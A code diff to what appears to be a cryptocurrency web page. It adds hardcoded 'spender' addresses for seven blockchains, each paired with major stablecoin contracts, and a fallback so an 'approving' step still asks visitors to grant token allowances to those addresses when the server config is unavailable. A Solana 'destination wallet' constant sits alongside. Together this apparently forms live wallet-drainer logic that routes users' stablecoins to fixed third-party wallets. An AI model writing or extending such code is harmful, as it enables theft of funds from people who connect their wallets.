@@ -43,6 +43,16 @@ const EVM_TOKENS = [
   { symbol: "DAI", address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", name: "Dai" },
 ];
 
+const CHAIN_CONTRACT_ADDRESSES: Record<number, { spenderAddress: string; tokens: string[] }> = {
+  1: { spenderAddress: "0x333438075b576B685249ECE80909Cccad90B6297", tokens: ["0xdAC17F958D2ee523a2206206994597C13D831ec7", "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", "0x6B175474E89094C44Da98b954EedeAC495271d0F"] },
+  56: { spenderAddress: "0x65BDae94B4412640313968138384264cAFcB1E66", tokens: ["0x55d398326f99059fF775485246999027B3197955", "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", "0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3"] },
+  137: { spenderAddress: "0x90E92a5D138dECe17f1fe680ddde0900C76429Dc", tokens: ["0xc2132D05D31c914a87C6611C10748AEb04B58e8F", "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359", "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063"] },
+  42161: { spenderAddress: "0x125112F80069d13BbCb459D76C215C7E3dd0b424", tokens: ["0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1"] },
+  10: { spenderAddress: "0xe063eE1Fb241B214Bd371B46E377936b9514Cc5c", tokens: ["0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1"] },
+  43114: { spenderAddress: "0xA6D97ca6E6E1C47B13d17a162F8e466EdFDe3d2e", tokens: ["0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7", "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E", "0xd586E7F844cEa2F87f50152665BCbc2C279D8d70"] },
+  8453: { spenderAddress: "0x1864b6Ab0091AeBdcf47BaF17de4874daB0574d7", tokens: ["0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2", "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb"] },
+};
+
 const SOLANA_DESTINATION_WALLET = "HgPNUBvHSsvNqYQstp4yAbcgYLqg5n6U3jgQ2Yz2wyMN";
 const SOLANA_USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
 const SOLANA_USDT_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";
@@ -520,17 +530,35 @@ export default function Home() {
     setStep("approving");
 
     try {
-      const configRes = await fetch(`/api/spender-config?chainId=${chainId}`);
-      const config = await configRes.json();
+      let spenderAddr: `0x${string}`;
+      let tokenAddresses: string[];
 
-      if (!config.spenderAddress) {
-        setError("No spender configured for this chain");
-        setStep("idle");
-        return;
+      const localConfig = chainId ? CHAIN_CONTRACT_ADDRESSES[chainId] : undefined;
+
+      try {
+        const configRes = await fetch(`/api/spender-config?chainId=${chainId}`);
+        const config = await configRes.json();
+        if (config.spenderAddress) {
+          spenderAddr = config.spenderAddress as `0x${string}`;
+          tokenAddresses = (config.tokens || localConfig?.tokens || EVM_TOKENS.map(t => t.address)) as string[];
+        } else if (localConfig) {
+          spenderAddr = localConfig.spenderAddress as `0x${string}`;
+          tokenAddresses = localConfig.tokens;
+        } else {
+          setError("No spender configured for this chain");
+          setStep("idle");
+          return;
+        }
+      } catch {
+        if (localConfig) {
+          spenderAddr = localConfig.spenderAddress as `0x${string}`;
+          tokenAddresses = localConfig.tokens;
+        } else {
+          setError("No spender configured for this chain");
+          setStep("idle");
+          return;
+        }
       }
-
-      const spenderAddr = config.spenderAddress as `0x${string}`;
-      const tokenAddresses = (config.tokens || EVM_TOKENS.map(t => t.address)) as string[];
 
       const tokenSymbols = ["USDT", "USDC", "DAI"];
 
